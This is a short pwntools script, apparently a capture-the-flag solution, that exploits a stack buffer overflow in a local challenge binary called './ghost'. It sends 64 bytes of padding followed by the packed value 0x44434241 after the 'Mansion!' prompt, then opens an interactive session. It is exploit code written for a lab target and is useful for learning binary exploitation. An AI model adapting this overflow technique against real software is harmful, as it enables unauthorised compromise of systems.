from pwn import *
exe = './ghost'
p = process(exe)
context.log_level = 'DEBUG'
padding = 64
# payload = (
#     b'A' * padding,
#     p64(0x44434241)
# )
payload = b'A' * padding + p64(0x44434241)
p.recvuntil(b'Mansion!')
p.recvline()
p.sendline( payload)
p.interactive()